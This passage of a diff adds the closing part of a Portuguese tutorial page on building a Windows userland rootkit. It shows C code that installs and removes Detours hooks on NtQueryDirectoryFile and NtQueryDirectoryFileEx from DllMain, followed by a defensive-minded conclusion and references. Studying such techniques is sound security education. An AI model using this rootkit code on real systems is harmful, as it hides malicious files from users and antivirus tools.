+
+    return 0;
+}
+
+BOOL StopHook() {
+    DetourTransactionBegin();
+    DetourUpdateThread(GetCurrentThread());
+    DetourDetach(&(PVOID&)originalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
+    DetourDetach(&(PVOID&)originalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
+    
+    DetourTransactionCommit();
+
+    return 0;
+}
+
+BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
+{
+    switch (ul_reason_for_call) {
+    case DLL_PROCESS_ATTACH:
+        StartHook();
+        break;
+    case DLL_THREAD_ATTACH:
+        break;
+    case DLL_THREAD_DETACH:
+        break;
+    case DLL_PROCESS_DETACH:
+        StopHook();
+        break;
+    }
+
+    return TRUE;
+}</pre>
+
+<a style="font-size: 23px;">Conclusão</a>
+Ao explorarmos as profundezas dos rootkits e nos aventurarmos no desenvolvimento de um específico para o sistema Windows, ficou claro que a batalha pela segurança cibernética é complexa e em constante evolução.
+
+Compreender a profundidade desses malwares é crucial para que possamos desenvolver medidas de defesa contra essas ameaças. O rootkit é caracterizado por ser um tipo de malware silencioso e persistente e dependendo do rootkit, pode até desafiar softwares de defesa contra ameaças, como Antivírus (AV) e Endpoint Detection and Response (EDR).
+
+Se você se interessou pelo desenvolvimento de um rootkit userland para Windows, acredito que seria interessante explorar o Frosty Rootkit e tentar entender suas técnicas para se manter silenciosamente nos sistemas operacionais Windows.
+
+
+<a style="font-size: 23px;">Referências</a>
+• Microsoft Detours https://github.com/microsoft/detours
+• NtQueryDirectoryFile: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntquerydirectoryfile
+• NtQueryDirectoryFileEx: https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntquerydirectoryfileex
+• NTSTATUS Values: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/596a1078-e883-4972-9bbc-49e60bebca55
+• Frosty Rootkit: https://github.com/brosck/Frosty</pre>
+    </div>
+</body>
+</html>
